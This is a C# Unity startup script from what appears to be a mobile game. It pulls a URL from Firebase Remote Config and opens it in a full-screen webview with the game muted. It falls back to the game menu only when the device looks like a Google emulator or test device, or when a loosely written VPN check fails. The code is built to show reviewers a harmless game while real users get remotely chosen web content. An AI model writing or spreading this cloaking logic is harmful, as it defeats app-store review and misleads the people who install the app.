using System;
using System.Collections;
using System.Linq;
using System.Net.NetworkInformation;
using System.Threading.Tasks;
using Bootstrapper;
using Bootstrapper.StateMachine;
using Firebase;
using Firebase.RemoteConfig;
using UnityEngine;

public class InitSystem : GameSystem
{
  [SerializeField] private WebViewScreen webScreen;
  [SerializeField] private Sounds sounds;
  [SerializeField] private bool isGameTest;
  private readonly string ToKey = "to";
  private readonly string UrlKey = "url";

  internal override async void EnterState()
  {
    sounds.Init(PlayerData);
    if (isGameTest)
    {
      ToMenu();
      return;
    }

    if (Application.internetReachability == NetworkReachability.NotReachable)
    {
      Debug.Log("not internet connection");
      HyperBootstrapper.Instance.ChangeState(GameStateID.Pause);
      return;
    }

    if (!string.IsNullOrEmpty(PlayerData.URL))
    {
      OpenWebView(PlayerData.URL);
      return;
    }

    await FetchDataAsync();
    StartCoroutine(TryMoveToWebView());
  }

  private string GetUrlFromRemoteConfigs()
  {
    return FirebaseRemoteConfig.DefaultInstance.GetValue(UrlKey).StringValue;
  }

  public bool GetIsCheckVpnConnection()
  {
    return FirebaseRemoteConfig.DefaultInstance.GetValue(ToKey).BooleanValue;
  }

  private void OpenWebView(string url)
  {
    Sounds.Instance.SetVolume(0f);
    HyperBootstrapper.Instance.ChangeState(GameStateID.WebView);
    webScreen.SetUrl(url);
  }

  public async Task FetchDataAsync()
  {
    try
    {
      Debug.Log("Fetching data...");
      await FirebaseApp.CheckAndFixDependenciesAsync();
      await FirebaseRemoteConfig.DefaultInstance.FetchAndActivateAsync();
      Debug.LogError("fetched data");
    }
    catch (Exception e)
    {
      Debug.Log(e.Message);
    }
  }

  private IEnumerator TryMoveToWebView()
  {
    yield return new WaitForSeconds(3);
    var isCheckVpn = GetIsCheckVpnConnection();
    Debug.Log($"need check vpn connection {isCheckVpn}");
    if (IsEmulator() | !HasUrl() || (isCheckVpn && !IsValVPN()))
    {
      Debug.LogError($"emulator:{IsEmulator()}  have url:{HasUrl()} needCheckVpn:{isCheckVpn} vpn:{IsValVPN()}");
      ToMenu();
      yield break;
    }

    var url = GetUrlFromRemoteConfigs();
    Debug.Log(url);
    PlayerData.URL = url;
    HyperBootstrapper.Instance.Save();
    OpenWebView(url);
  }

  private bool HasUrl()
  {
    if (!FirebaseRemoteConfig.DefaultInstance.Keys.Contains(UrlKey))
    {
      Debug.Log("do not have url");
      return false;
    }

    if (string.IsNullOrEmpty(GetUrlFromRemoteConfigs()))
    {
      Debug.Log("null url");
      return false;
    }

    return true;
  }

  private bool IsEmulator()
  {
    var isEm =
      SystemInfo.deviceModel.ToLower().Contains("google") ||
      SystemInfo.deviceName.ToLower().Contains("google");
    Debug.Log(isEm);
    return isEm;
  }

  private bool IsValVPN()
  {
    if (NetworkInterface.GetIsNetworkAvailable())
    {
      var interfaces = NetworkInterface.GetAllNetworkInterfaces();
      foreach (var Interface in interfaces)
        if (Interface.OperationalStatus == OperationalStatus.Up)
        {
          if (Interface.NetworkInterfaceType == NetworkInterfaceType.Ppp &&
              Interface.NetworkInterfaceType != NetworkInterfaceType.Loopback)
          {
            var statistics = Interface.GetIPv4Statistics();
            Debug.Log(Interface.Name + " " + Interface.NetworkInterfaceType + " "
                      + Interface.Description);
            return false;
          }

          Debug.Log("VPN Connection is lost!");
          return true;
        }
    }

    return false;
  }
}